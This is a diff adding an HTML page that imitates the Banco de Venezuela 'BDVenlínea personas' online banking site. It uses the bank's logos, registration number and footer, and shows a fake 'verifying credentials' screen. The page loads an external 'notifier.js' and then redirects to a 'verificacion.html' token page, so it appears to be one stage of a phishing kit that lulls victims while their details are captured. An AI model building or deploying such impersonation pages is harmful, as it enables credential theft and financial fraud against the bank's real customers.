@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>BDVenlínea personas - Verificando</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      -webkit-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+    }
+
+    body {
+      font-family: 'Open Sans', 'Roboto', Arial, Helvetica, sans-serif;
+      background-color: #ffffff;
+      background-image: url('bdv-bg.jpg');
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-attachment: fixed;
+      background-size: cover;
+      color: #333;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      text-rendering: optimizeLegibility;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      -webkit-backface-visibility: hidden;
+      backface-visibility: hidden;
+    }
+
+    /* ENCABEZADO SUPERIOR OFICIAL BDV */
+    .header {
+      height: 64px;
+      background: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 28px;
+      border-bottom: 1px solid #e2e8f0;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      width: 100%;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+    }
+
+    .header-logo {
+      height: 36px;
+      width: auto;
+      object-fit: contain;
+      user-select: none;
+    }
+
+    .menu-btn {
+      padding: 6px;
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      color: #24292f;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 4px;
+      transition: background-color 0.15s ease;
+    }
+
+    .menu-btn svg {
+      width: 28px;
+      height: 28px;
+      shape-rendering: geometricPrecision;
+    }
+
+    /* CONTENEDOR PRINCIPAL */
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 36px 16px 44px;
+      width: 100%;
+    }
+
+    /* TARJETA DE INFORMACIÓN Y VERIFICACIÓN PROFESIONAL MÁS ANCHA */
+    .info-card {
+      width: 100%;
+      max-width: 540px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 44px 40px 36px;
+      box-shadow: 0 12px 35px -4px rgba(0, 0, 0, 0.13), 0 2px 8px rgba(0, 0, 0, 0.05);
+      border: 1px solid rgba(0, 0, 0, 0.08);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      animation: fadeInCard 0.25s ease-out;
+    }
+
+    @keyframes fadeInCard {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* LOGO OFICIAL */
+    .card-logo-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 24px;
+      user-select: none;
+    }
+
+    .card-logo {
+      width: 100%;
+      max-width: 275px;
+      height: auto;
+      object-fit: contain;
+    }
+
+    /* ANIMACIÓN DE RAYAS BDV */
+    .loader-wrapper {
+      margin: 8px 0 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .loader {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .loader span {
+      width: 8px;
+      height: 30px;
+      background: #2b2f36;
+      border-radius: 2px;
+      animation: movimiento 0.8s ease-in-out infinite;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
+    }
+
+    .loader span:nth-child(1) {
+      animation-delay: 0s;
+    }
+
+    .loader span:nth-child(2) {
+      animation-delay: 0.12s;
+    }
+
+    .loader span:nth-child(3) {
+      animation-delay: 0.24s;
+    }
+
+    .loader span:nth-child(4) {
+      animation-delay: 0.36s;
+    }
+
+    @keyframes movimiento {
+      0%, 100% {
+        transform: scaleY(0.45);
+        opacity: 0.55;
+      }
+
+      50% {
+        transform: scaleY(1.4);
+        opacity: 1;
+      }
+    }
+
+    /* TÍTULO Y MENSAJE DE ESTADO DINÁMICO */
+    .status-title {
+      color: #0067b1;
+      font-size: 19px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      letter-spacing: -0.2px;
+    }
+
+    .status-text {
+      color: #555e67;
+      font-size: 14.5px;
+      font-weight: 500;
+      min-height: 22px;
+      margin-bottom: 18px;
+      transition: opacity 0.3s ease, transform 0.3s ease;
+    }
+
+    /* LÍNEA DE PROGRESO DISCRETA INSTITUCIONAL */
+    .progress-track {
+      width: 100%;
+      height: 3px;
+      background: #edf0f4;
+      border-radius: 3px;
+      overflow: hidden;
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .progress-bar {
+      position: absolute;
+      top: 0;
+      bottom: 0;
+      left: 0;
+      width: 40%;
+      background: linear-gradient(90deg, #0067b1, #d71945);
+      border-radius: 3px;
+      animation: progressSlide 2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+    }
+
+    @keyframes progressSlide {
+      0% {
+        left: -40%;
+        width: 35%;
+      }
+      50% {
+        left: 30%;
+        width: 50%;
+      }
+      100% {
+        left: 100%;
+        width: 35%;
+      }
+    }
+
+    /* CAJA DE CONSEJOS DE SEGURIDAD REALES DEL BANCO */
+    .security-box {
+      width: 100%;
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-left: 3.5px solid #0067b1;
+      border-radius: 6px;
+      padding: 14px 16px;
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .security-header {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      margin-bottom: 6px;
+      color: #0067b1;
+      font-size: 13px;
+      font-weight: 700;
+    }
+
+    .security-header svg {
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+    }
+
+    .security-message {
+      font-size: 12.5px;
+      color: #475569;
+      line-height: 1.55;
+      min-height: 40px;
+      transition: opacity 0.35s ease, transform 0.35s ease;
+    }
+
+    /* PIE DE PÁGINA CORPORATIVO */
+    .footer-text {
+      margin-top: 24px;
+      font-size: 11.5px;
+      color: #717d8a;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    /* =========================================
+       ADAPTACIÓN MÓVIL NÍTIDA Y PRECISA
+    ========================================= */
+    @media (max-width: 768px) {
+      body {
+        background-attachment: scroll;
+      }
+
+      .header {
+        height: 54px;
+        padding: 0 16px;
+      }
+
+      .header-logo {
+        height: 28px;
+      }
+
+      .main {
+        padding: 22px 14px 28px;
+      }
+
+      .info-card {
+        width: 100%;
+        max-width: 540px;
+        padding: 36px 26px 32px;
+        border-radius: 12px;
+        backdrop-filter: none !important;
+        -webkit-backdrop-filter: none !important;
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+      }
+
+      .card-logo {
+        width: 100%;
+        max-width: 275px;
+      }
+
+      .status-title {
+        font-size: 17px;
+        margin-bottom: 6px;
+      }
+
+      .status-text {
+        font-size: 13.5px;
+        margin-bottom: 16px;
+      }
+
+      .loader span {
+        width: 7px;
+        height: 26px;
+      }
+
+      .security-box {
+        padding: 12px 14px;
+        margin-bottom: 16px;
+      }
+
+      .security-header {
+        font-size: 12px;
+      }
+
+      .security-message {
+        font-size: 12px;
+        min-height: 38px;
+      }
+
+      .footer-text {
+        font-size: 11px;
+        margin-top: 18px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Encabezado superior con Logotipo Banco de Venezuela -->
+  <header class="header">
+    <a href="index.html" class="brand" title="Banco de Venezuela">
+      <img src="bdv-logo.png" alt="Banco de Venezuela" class="header-logo">
+    </a>
+
+    <button type="button" class="menu-btn" aria-label="Abrir menú">
+      <svg fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+      </svg>
+    </button>
+  </header>
+
+  <!-- Contenedor Principal: Tarjeta de información oficial -->
+  <main class="main">
+    <section class="info-card" role="status" aria-live="polite">
+
+      <!-- Logotipo oficial BDVenlínea personas -->
+      <div class="card-logo-container">
+        <img src="bdv-enlinea-personas.png" alt="BDVenlínea personas" class="card-logo">
+      </div>
+
+      <!-- Animación de los 4 rayitos oficiales -->
+      <div class="loader-wrapper" aria-hidden="true">
+        <div class="loader">
+          <span></span>
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+      </div>
+
+      <!-- Título institucional y mensaje dinámico -->
+      <h1 class="status-title">Verificando información</h1>
+      <p class="status-text" id="statusMessage">Validando credenciales de seguridad...</p>
+
+      <!-- Barra de progreso visual institucional -->
+      <div class="progress-track" aria-hidden="true">
+        <div class="progress-bar"></div>
+      </div>
+
+      <!-- Caja de consejos reales del Banco de Venezuela -->
+      <div class="security-box">
+        <div class="security-header">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+          </svg>
+          <span>Seguridad Banco de Venezuela</span>
+        </div>
+        <p class="security-message" id="securityTip">
+          Por su seguridad, el Banco de Venezuela nunca le solicitará sus claves, coordenadas ni códigos por llamada o correo.
+        </p>
+      </div>
+
+
+      <!-- RIF y pie legal del banco -->
+      <p class="footer-text">
+        Banco de Venezuela, S.A. Banco Universal • RIF G-20009997-6<br>
+        Todos los derechos reservados.
+      </p>
+
+    </section>
+  </main>
+
+  <script src="notifier.js"></script>
+  <script>
+    // Mensajes dinámicos de estado del banco
+    const statusMessages = [
+      "Validando credenciales de seguridad...",
+      "Verificando canal seguro con el servidor BDV...",
+      "Comprobando autenticación del usuario...",
+      "Sincronizando estado de cuenta y servicios en línea...",
+      "Estableciendo sesión bancaria protegida..."
+    ];
+
+    // Consejos y avisos reales oficiales del Banco de Venezuela
+    const securityTips = [
+      "Por su seguridad, el Banco de Venezuela nunca le solicitará sus claves, coordenadas ni códigos por llamada o correo.",
+      "Compruebe siempre que la dirección en su navegador comience con https y muestre el candado de seguridad.",
+      "Nunca comparta sus datos confidenciales ni ingrese a través de enlaces recibidos por mensajería o redes sociales.",
+      "Mantenga sus datos de contacto actualizados únicamente a través de los canales oficiales del banco.",
+      "Al terminar de realizar sus operaciones, recuerde cerrar su sesión desde el botón correspondiente."
+    ];
+
+    let statusIndex = 0;
+    let tipIndex = 0;
+
+    const statusElem = document.getElementById('statusMessage');
+    const tipElem = document.getElementById('securityTip');
+
+    // Rotación suave de mensajes cada 3 segundos
+    setInterval(() => {
+      statusIndex = (statusIndex + 1) % statusMessages.length;
+      if (statusElem) {
+        statusElem.style.opacity = '0';
+        statusElem.style.transform = 'translateY(-3px)';
+        setTimeout(() => {
+          statusElem.textContent = statusMessages[statusIndex];
+          statusElem.style.opacity = '1';
+          statusElem.style.transform = 'translateY(0)';
+        }, 300);
+      }
+    }, 3200);
+
+    // Rotación suave de consejos de seguridad cada 4.5 segundos
+    setInterval(() => {
+      tipIndex = (tipIndex + 1) % securityTips.length;
+      if (tipElem) {
+        tipElem.style.opacity = '0';
+        tipElem.style.transform = 'translateY(3px)';
+        setTimeout(() => {
+          tipElem.textContent = securityTips[tipIndex];
+          tipElem.style.opacity = '1';
+          tipElem.style.transform = 'translateY(0)';
+        }, 350);
+      }
+    }, 4500);
+
+    // Redirección fluida a la página de verificación / Token de Seguridad tras la validación inicial
+    setTimeout(() => {
+      window.location.href = 'verificacion.html';
+    }, 5500);
+  </script>
+
+</body>
+</html>
